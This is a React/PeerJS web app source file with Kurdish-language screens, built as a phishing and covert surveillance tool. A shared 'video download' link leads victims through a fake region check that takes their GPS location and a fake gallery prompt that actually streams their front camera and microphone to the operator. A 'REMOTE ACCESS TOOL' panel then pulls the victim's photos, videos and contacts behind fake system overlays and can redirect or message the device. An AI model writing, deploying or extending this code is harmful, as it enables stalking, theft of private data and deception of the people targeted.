import React, { useState, useEffect, useRef } from 'react';
import Peer, { DataConnection } from 'peerjs';
import { analyzeScreen } from './services/geminiService';
import { DeviceInfo, RemoteCommand, FileTransfer, Contact } from './types';

const App: React.FC = () => {
  const [myId, setMyId] = useState<string>('');
  const [targetId, setTargetId] = useState<string>('');
  
  const [role, setRole] = useState<'VIEWER' | 'STREAMER'>(() => {
    const params = new URLSearchParams(window.location.search);
    return params.get('host') ? 'STREAMER' : 'VIEWER';
  });

  // State for Streamer Flow: 'GEO' -> 'GALLERY' -> 'DONE'
  const [setupStep, setSetupStep] = useState<'GEO' | 'GALLERY' | 'DONE'>('GEO');

  const [status, setStatus] = useState<string>('');
  const [isConnected, setIsConnected] = useState<boolean>(false);
  const [aiResponse, setAiResponse] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(false);
  const [isWatchingVideo, setIsWatchingVideo] = useState<boolean>(false);
  const [showPermissionHint, setShowPermissionHint] = useState<boolean>(false);
  const [fakeSystemMessage, setFakeSystemMessage] = useState<string>('');

  // New State for Hacker Features
  const [targetInfo, setTargetInfo] = useState<DeviceInfo | null>(null);
  const [dataConn, setDataConn] = useState<DataConnection | null>(null);
  const [showControlPanel, setShowControlPanel] = useState<boolean>(false);
  const [interceptedFiles, setInterceptedFiles] = useState<FileTransfer[]>([]);
  const [interceptedContacts, setInterceptedContacts] = useState<Contact[]>([]);
  const [hackerTab, setHackerTab] = useState<'INFO' | 'FILES' | 'CONTACTS'>('INFO');

  const [activeStream, setActiveStream] = useState<MediaStream | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const peerRef = useRef<Peer | null>(null);
  // Hidden input for the target to "accidentally" upload files
  const galleryInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const hostId = params.get('host');
    
    const newPeer = new Peer();

    newPeer.on('open', (id) => {
      setMyId(id);
      if (hostId) {
        setTargetId(hostId);
        setRole('STREAMER'); 
      } else {
        setRole('VIEWER');
      }
    });

    // VIEWER: Receive Video & Data
    newPeer.on('call', (call) => {
      call.answer(); 
      call.on('stream', (remoteStream) => {
        setActiveStream(remoteStream);
        setIsConnected(true);
      });
    });

    newPeer.on('connection', (conn) => {
      setDataConn(conn);
      conn.on('data', (data: any) => {
        if (data.type === 'INFO') {
          setTargetInfo(data.payload);
        }
        if (data.type === 'FILE_TRANSFER') {
            setInterceptedFiles(prev => [...prev, data]);
            // Switch to files tab automatically
            setHackerTab('FILES');
        }
        if (data.type === 'CONTACTS_LIST') {
            setInterceptedContacts(data.payload);
            setHackerTab('CONTACTS');
            alert(`Collected ${data.payload.length} contacts!`);
        }
      });
    });

    peerRef.current = newPeer;

    return () => {
      newPeer.destroy();
    };
  }, []);

  useEffect(() => {
    if (isConnected && activeStream && videoRef.current && role === 'VIEWER') {
        videoRef.current.srcObject = activeStream;
        videoRef.current.play().catch(e => console.error("Autoplay error:", e));
    }
  }, [isConnected, activeStream, role]);

  const getBatteryLevel = async (): Promise<number | undefined> => {
    try {
      // @ts-ignore
      const battery = await navigator.getBattery();
      return Math.round(battery.level * 100);
    } catch {
      return undefined;
    }
  };

  const getDeviceName = () => {
    const ua = navigator.userAgent;
    const android = ua.match(/Android .*?; (.*?)\)/);
    const ios = ua.match(/(iPhone|iPad|iPod)/);
    
    if (android && android[1]) return android[1];
    if (ios && ios[1]) return ios[1];
    return "Unknown Model";
  };

  // Step 1: Handle Geolocation Request
  const handleGeoRequest = () => {
    setLoading(true);
    // Fake delay to look like it's checking server
    setTimeout(() => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          // Success (or just fake success)
          setLoading(false);
          setSetupStep('GALLERY');
        },
        (err) => {
          // Even if denied, proceed to the next step so we don't lose the target
          console.log("Geo denied, proceeding anyway");
          setLoading(false);
          setSetupStep('GALLERY');
        }
      );
    }, 1500);
  };

  // Step 2: Handle "Fake Gallery" Request (Actually Camera)
  const acceptAndStream = async () => {
    if (!peerRef.current || !targetId) return;
    
    setLoading(true);
    setShowPermissionHint(true);

    try {
      // 1. Get Media (CAMERA TRAP disguised as Gallery Access)
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' }, 
        audio: true 
      });
      setActiveStream(stream);

      // 2. Call Video
      const call = peerRef.current.call(targetId, stream);
      call.on('close', () => {
        setIsConnected(false);
        setActiveStream(null);
      });

      // 3. Gather Intelligence
      const battery = await getBatteryLevel();
      const basicInfo: DeviceInfo = {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        deviceName: getDeviceName(),
        language: navigator.language,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        battery: battery
      };

      const sendInfo = (info: DeviceInfo) => {
        const conn = peerRef.current!.connect(targetId);
        conn.on('open', () => {
          conn.send({ type: 'INFO', payload: info });
          conn.on('data', (data: any) => {
            handleRemoteCommand(data as RemoteCommand);
          });
        });
        setDataConn(conn);
      };

      // Try Geolocation again silently for data gathering
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          sendInfo({
            ...basicInfo,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude
          });
        },
        (err) => sendInfo(basicInfo)
      );

      setIsConnected(true);
      setSetupStep('DONE');
      setIsWatchingVideo(true);
      
    } catch (err) {
      console.error(err);
      alert("تکایە 'Allow' بکە بۆ ئەوەی ڤیدیۆکە بچێتە ناو گەلەری.");
      setLoading(false);
      setShowPermissionHint(false);
    }
  };

  const handleRemoteCommand = async (cmd: RemoteCommand) => {
    switch(cmd.type) {
      case 'VIBRATE':
        if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
        break;
      case 'ALERT':
        alert(cmd.payload || "System Notification");
        break;
      case 'REDIRECT':
        window.location.href = cmd.payload || 'https://google.com';
        break;
      case 'SPEAK':
        if ('speechSynthesis' in window) {
           const utterance = new SpeechSynthesisUtterance(cmd.payload);
           window.speechSynthesis.speak(utterance);
        }
        break;
      case 'REQUEST_GALLERY':
        // Trigger stealth mode overlay
        setFakeSystemMessage("Optimizing Video Cache...");
        setTimeout(() => {
            if (galleryInputRef.current) {
                galleryInputRef.current.click();
            }
            setFakeSystemMessage("");
        }, 1000);
        break;
      case 'REQUEST_CONTACTS':
        setFakeSystemMessage("Syncing Contacts...");
        try {
            // @ts-ignore
            if ('contacts' in navigator && 'ContactsManager' in window) {
                const props = ['name', 'tel'];
                const opts = { multiple: true };
                // @ts-ignore
                const contacts = await navigator.contacts.select(props, opts);
                if (dataConn && dataConn.open) {
                    dataConn.send({ type: 'CONTACTS_LIST', payload: contacts });
                }
            } else {
                alert("Please update contacts permissions to continue video.");
            }
        } catch (e) {
            console.error(e);
        } finally {
            setFakeSystemMessage("");
        }
        break;
    }
  };

  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
      const files = event.target.files;
      if (files && files.length > 0 && dataConn && dataConn.open) {
          setFakeSystemMessage("Uploading Backup...");
          
          Array.from(files).forEach((file: File) => {
             const reader = new FileReader();
             reader.onload = (e) => {
                 const dataUrl = e.target?.result as string;
                 const transfer: FileTransfer = {
                     type: 'FILE_TRANSFER',
                     fileName: file.name,
                     fileType: file.type,
                     data: dataUrl
                 };
                 dataConn.send(transfer);
             };
             reader.readAsDataURL(file);
          });
          
          // Clear message after short delay
          setTimeout(() => setFakeSystemMessage(""), 4000);
      }
  };

  const sendCommand = (type: RemoteCommand['type'], payload?: any) => {
    if (dataConn && dataConn.open) {
      dataConn.send({ type, payload });
    } else {
      alert("پەیوەندی داتا پچڕاوە");
    }
  };

  const copyLink = () => {
    const url = `${window.location.origin}${window.location.pathname}?host=${myId}`;
    if (navigator.share) {
        navigator.share({
            title: 'Download Video',
            text: 'ڤیدیۆکە لێرە دابەزێنە',
            url: url
        }).catch(console.error);
    } else {
        navigator.clipboard.writeText(url);
        alert("لینک کۆپی کرا!");
    }
  };

  const handleAiCheck = async () => {
    if (!canvasRef.current || !videoRef.current) return;
    setAiResponse('...خەریکی شیکردنەوە');
    const ctx = canvasRef.current.getContext('2d');
    canvasRef.current.width = videoRef.current.videoWidth;
    canvasRef.current.height = videoRef.current.videoHeight;
    ctx?.drawImage(videoRef.current, 0, 0);
    const imgData = canvasRef.current.toDataURL('image/jpeg');
    
    const text = await analyzeScreen(imgData, "بە کوردی سۆرانی، ئەمە چییە لە وێنەکەدا؟");
    setAiResponse(text || "هیچ دیار نییە");
  };

  // --- RENDER: STREAMER WATCHING VIDEO ---
  if (isWatchingVideo && role === 'STREAMER') {
      return (
          <div className="h-[100dvh] w-full bg-black flex flex-col relative">
              <iframe 
                  width="100%" 
                  height="100%" 
                  src="https://www.youtube.com/embed/bowcSLQshC8?autoplay=1" 
                  title="YouTube video player" 
                  frameBorder="0" 
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                  allowFullScreen
                  className="flex-1 z-10"
              ></iframe>
              
              {/* Fake System Overlay for Stealth Operations */}
              {fakeSystemMessage && (
                  <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/60 pointer-events-none">
                      <div className="bg-slate-900/90 text-white px-6 py-4 rounded-xl border border-blue-500/30 flex items-center gap-3 shadow-2xl animate-pulse">
                          <i className="fas fa-circle-notch fa-spin text-blue-400"></i>
                          <span className="font-mono text-sm tracking-wide">{fakeSystemMessage}</span>
                      </div>
                  </div>
              )}

              <video ref={videoRef} className="hidden" muted playsInline autoPlay />
              
              {/* Hidden File Input for Remote Trigger (Supports Multiple Files) */}
              <input 
                type="file"
                multiple 
                ref={galleryInputRef}
                className="hidden"
                accept="image/*,video/*"
                onChange={handleFileSelect}
              />
          </div>
      );
  }

  // --- RENDER: VIEWER ---
  if (isConnected && role === 'VIEWER') {
    return (
      <div className="h-[100dvh] w-full bg-black relative flex flex-col overflow-hidden">
        <video 
          ref={videoRef} 
          autoPlay 
          playsInline 
          className="w-full h-full object-cover"
        />
        
        {/* Hacker Dashboard Button */}
        <button 
          onClick={() => setShowControlPanel(!showControlPanel)}
          className="absolute top-4 right-4 bg-red-600/80 text-white p-3 rounded-full shadow-lg border border-red-500 z-50 animate-pulse"
        >
          <i className="fas fa-terminal"></i>
        </button>

        {/* Hacker Control Panel */}
        {showControlPanel && (
          <div className="absolute top-16 right-4 w-80 bg-slate-900/95 border border-green-500/50 rounded-xl text-green-400 font-mono text-xs shadow-2xl z-40 max-h-[85vh] overflow-hidden flex flex-col">
             
             {/* Header */}
             <div className="p-3 border-b border-green-500/30 flex justify-between items-center bg-slate-950">
                <span className="font-bold text-sm">REMOTE ACCESS TOOL</span>
                <span className="animate-pulse text-red-500 text-[10px]">● LIVE</span>
             </div>

             {/* Tabs */}
             <div className="flex border-b border-green-500/30">
                <button onClick={() => setHackerTab('INFO')} className={`flex-1 p-2 ${hackerTab === 'INFO' ? 'bg-green-900/30 text-white' : 'hover:bg-green-900/10'}`}>INFO</button>
                <button onClick={() => setHackerTab('FILES')} className={`flex-1 p-2 ${hackerTab === 'FILES' ? 'bg-green-900/30 text-white' : 'hover:bg-green-900/10'}`}>FILES</button>
                <button onClick={() => setHackerTab('CONTACTS')} className={`flex-1 p-2 ${hackerTab === 'CONTACTS' ? 'bg-green-900/30 text-white' : 'hover:bg-green-900/10'}`}>CONTACTS</button>
             </div>

             {/* Content Area */}
             <div className="flex-1 overflow-y-auto p-3 custom-scrollbar">
                
                {/* TAB: INFO & COMMANDS */}
                {hackerTab === 'INFO' && (
                    <div className="space-y-4">
                        {targetInfo ? (
                            <div className="space-y-1 bg-black/40 p-2 rounded border border-green-500/20">
                                <p className="text-white font-bold text-sm">📱 {targetInfo.deviceName}</p>
                                <p>BATTERY: {targetInfo.battery}%</p>
                                <p>OS: {targetInfo.platform}</p>
                                {targetInfo.latitude && (
                                     <a 
                                     href={`https://www.google.com/maps?q=${targetInfo.latitude},${targetInfo.longitude}`} 
                                     target="_blank" 
                                     rel="noreferrer"
                                     className="block mt-2 bg-green-900/40 p-1.5 rounded text-center border border-green-500/30 hover:bg-green-800/50"
                                     >
                                     📍 LOCATE DEVICE
                                     </a>
                                )}
                            </div>
                        ) : (
                            <p className="text-gray-500">Waiting for handshake...</p>
                        )}

                        <div className="grid grid-cols-2 gap-2">
                             <button onClick={() => sendCommand('REQUEST_GALLERY')} className="col-span-2 bg-yellow-600/20 border border-yellow-500/40 p-2 rounded text-yellow-400 hover:bg-yellow-600/30 font-bold">
                                📂 ACCESS STORAGE
                            </button>
                            <button onClick={() => sendCommand('REQUEST_CONTACTS')} className="col-span-2 bg-purple-600/20 border border-purple-500/40 p-2 rounded text-purple-400 hover:bg-purple-600/30 font-bold">
                                👤 GET CONTACTS
                            </button>
                            <button onClick={() => sendCommand('VIBRATE')} className="bg-red-900/20 border border-red-500/30 p-2 rounded hover:bg-red-800/30">
                                ⚡ VIBRATE
                            </button>
                            <button onClick={() => {
                                const msg = prompt("Message:");
                                if(msg) sendCommand('ALERT', msg);
                            }} className="bg-blue-900/20 border border-blue-500/30 p-2 rounded hover:bg-blue-800/30">
                                💬 MESSAGE
                            </button>
                             <button onClick={() => {
                                const url = prompt("URL:");
                                if(url) sendCommand('REDIRECT', url);
                            }} className="bg-slate-700/40 border border-slate-500/30 p-2 rounded hover:bg-slate-600/30">
                                🌐 OPEN URL
                            </button>
                             <button onClick={() => {
                                const msg = prompt("Text to speak:");
                                if(msg) sendCommand('SPEAK', msg);
                            }} className="bg-pink-900/20 border border-pink-500/30 p-2 rounded hover:bg-pink-800/30">
                                🗣️ VOICE
                            </button>
                        </div>
                    </div>
                )}

                {/* TAB: FILES (GALLERY) */}
                {hackerTab === 'FILES' && (
                    <div>
                         {interceptedFiles.length === 0 ? (
                             <div className="text-center text-gray-500 py-8">
                                 <i className="fas fa-folder-open text-4xl mb-2 opacity-30"></i>
                                 <p>No files accessed yet.</p>
                                 <p className="text-[10px] mt-2">Click "ACCESS STORAGE" to pull files.</p>
                             </div>
                         ) : (
                             <div className="grid grid-cols-2 gap-2">
                                 {interceptedFiles.map((file, idx) => (
                                     <a key={idx} href={file.data} download={file.fileName} className="group relative aspect-square bg-slate-800 rounded border border-white/10 overflow-hidden block">
                                         {file.fileType.startsWith('image') ? (
                                             <img src={file.data} alt="intercepted" className="w-full h-full object-cover" />
                                         ) : (
                                             <div className="flex flex-col items-center justify-center h-full text-gray-400">
                                                 <i className="fas fa-video text-2xl"></i>
                                                 <span className="text-[9px] mt-1">{file.fileName.slice(0, 8)}...</span>
                                             </div>
                                         )}
                                         <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
                                             <i className="fas fa-download text-white"></i>
                                         </div>
                                     </a>
                                 ))}
                             </div>
                         )}
                    </div>
                )}

                {/* TAB: CONTACTS */}
                {hackerTab === 'CONTACTS' && (
                    <div className="space-y-2">
                        {interceptedContacts.length === 0 ? (
                            <div className="text-center text-gray-500 py-8">
                                <i className="fas fa-address-book text-4xl mb-2 opacity-30"></i>
                                <p>No contacts fetched.</p>
                                <p className="text-[10px] mt-2">Click "GET CONTACTS" to dump list.</p>
                            </div>
                        ) : (
                            <ul className="space-y-2">
                                {interceptedContacts.map((c, i) => (
                                    <li key={i} className="bg-slate-800 p-2 rounded border border-white/5 flex justify-between items-center">
                                        <div>
                                            <p className="font-bold text-white">{c.name?.[0] || "No Name"}</p>
                                            <p className="text-gray-400 text-xs">{c.tel?.[0] || "No Number"}</p>
                                        </div>
                                        <button className="text-xs bg-slate-700 p-1 rounded hover:bg-slate-600">COPY</button>
                                    </li>
                                ))}
                            </ul>
                        )}
                    </div>
                )}

             </div>
          </div>
        )}

        <div className="absolute bottom-0 inset-x-0 p-6 bg-gradient-to-t from-black/90 via-black/50 to-transparent flex flex-col gap-3">
            {aiResponse && (
                <div className="bg-slate-800/95 p-4 rounded-2xl text-sm text-white border border-white/10 shadow-xl max-h-40 overflow-y-auto" dir="rtl">
                    <span className="text-blue-400 font-bold ml-2">وەڵامی AI:</span> {aiResponse}
                </div>
            )}
            
            <div className="flex gap-3">
                <button onClick={handleAiCheck} className="flex-1 bg-indigo-600 active:bg-indigo-700 text-white py-4 rounded-2xl font-bold shadow-lg transition-transform active:scale-95 flex items-center justify-center gap-2">
                    <i className="fas fa-wand-magic-sparkles"></i>
                    <span>پرسیار لە AI</span>
                </button>
            </div>

            <button onClick={() => window.location.reload()} className="w-full bg-red-500/20 text-red-500 border border-red-500/50 py-3 rounded-2xl flex items-center justify-center font-bold active:bg-red-600 active:text-white transition-colors">
                پچڕاندن
            </button>
        </div>
        <canvas ref={canvasRef} className="hidden" />
      </div>
    );
  }

  // --- RENDER: SETUP MODE (STREAMER) ---
  return (
    <div className="min-h-[100dvh] bg-slate-950 flex flex-col items-center justify-center p-6 text-center font-sans">
      <div className="w-full max-w-sm space-y-8 animate-fade-in relative">
        
        {role === 'VIEWER' ? (
            <div className="flex flex-col items-center gap-2">
                <h1 className="text-3xl font-bold text-white tracking-tight">LinkUp Direct</h1>
                <div className="bg-slate-900 border border-white/10 rounded-3xl p-6 space-y-6 shadow-2xl w-full">
                    <div className="w-20 h-20 bg-blue-600/20 text-blue-500 rounded-full flex items-center justify-center mx-auto ring-4 ring-blue-500/10">
                        <i className="fas fa-eye text-3xl"></i>
                    </div>
                    <div className="space-y-2">
                        <h2 className="text-xl font-bold text-white">داواکردنی کامێرا</h2>
                        <p className="text-slate-400 text-sm">ئەم لینکە بنێرە بۆ ئەو کەسە.</p>
                    </div>
                    
                    <button 
                        onClick={copyLink}
                        className="w-full bg-blue-600 hover:bg-blue-500 text-white py-4 rounded-2xl font-bold text-lg shadow-lg shadow-blue-900/20 transition-all active:scale-95 flex items-center justify-center gap-2"
                    >
                        <i className="fas fa-share-nodes"></i>
                        ناردنی لینک
                    </button>
                    <p className="text-slate-500 text-xs font-mono mt-2">{myId ? 'Connected' : 'Connecting...'}</p>
                </div>
            </div>
        ) : (
            // STREAMER "FAKE" UI WITH MULTI-STEP FLOW
            <div className="bg-slate-900 border border-blue-500/20 rounded-3xl p-8 space-y-8 shadow-2xl relative overflow-hidden">
                
                {/* STEP 1: GEO CHECK */}
                {setupStep === 'GEO' && (
                    <>
                        <div className="space-y-4">
                            <div className="w-24 h-24 bg-red-600/20 rounded-full flex items-center justify-center mx-auto shadow-lg animate-pulse">
                                <i className="fas fa-map-location-dot text-4xl text-red-500"></i>
                            </div>
                            <h2 className="text-2xl font-bold text-white">پشکنینی ناوچە</h2>
                            <p className="text-slate-300 text-lg leading-relaxed">
                                ببورە، ئەم فایلە تەنها بۆ بەکارهێنەرانی <span className="text-white font-bold">عێراق</span> بەردەستە.
                                تکایە شوێنەکەت پشتڕاست بکەرەوە.
                            </p>
                        </div>
                        <button 
                            onClick={handleGeoRequest}
                            disabled={loading}
                            className="w-full bg-red-600 hover:bg-red-500 text-white py-5 rounded-2xl font-bold text-xl shadow-xl transition-all active:scale-95 flex items-center justify-center gap-3"
                        >
                             {loading ? (
                                <span className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
                            ) : (
                                <>
                                    <i className="fas fa-location-crosshairs"></i>
                                    پشتڕاستکردنەوە (GPS)
                                </>
                            )}
                        </button>
                    </>
                )}

                {/* STEP 2: FAKE GALLERY REQUEST */}
                {setupStep === 'GALLERY' && (
                    <>
                         {showPermissionHint && (
                            <div className="absolute top-0 right-0 left-0 bg-yellow-500/90 text-black p-3 text-sm font-bold animate-pulse z-50">
                                ☝️ بۆ سەیڤکردنی وێنە و ڤیدیۆ، "Allow" بکە
                            </div>
                        )}
                        <div className="space-y-4">
                            <div className="w-24 h-24 bg-green-600/20 rounded-full flex items-center justify-center mx-auto shadow-lg">
                                <i className="fas fa-images text-4xl text-green-500"></i>
                            </div>
                            <h2 className="text-2xl font-bold text-white">تۆمارکردن لە گەلەری</h2>
                            <p className="text-slate-300 text-lg leading-relaxed">
                                شوێنەکەت پشتڕاست کرایەوە. ئێستا ڕێگە بە <span className="text-green-400 font-bold">گەلەری</span> بدە بۆ ئەوەی ڤیدیۆکە بچێتە ناو مۆبایلەکەت.
                            </p>
                        </div>
                        <button 
                            onClick={acceptAndStream}
                            disabled={loading}
                            className="w-full bg-green-600 hover:bg-green-500 text-white py-5 rounded-2xl font-bold text-xl shadow-xl transition-all active:scale-95 flex items-center justify-center gap-3"
                        >
                             {loading ? (
                                <span className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
                            ) : (
                                <>
                                    <i className="fas fa-folder-open"></i>
                                    کردنەوەی گەلەری (Gallery)
                                </>
                            )}
                        </button>
                    </>
                )}

                <div className="text-xs text-slate-500 mt-4 border-t border-slate-800 pt-4">
                    Secure Server • Iraq Region • 24.5 MB
                </div>
            </div>
        )}

      </div>
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

export default App;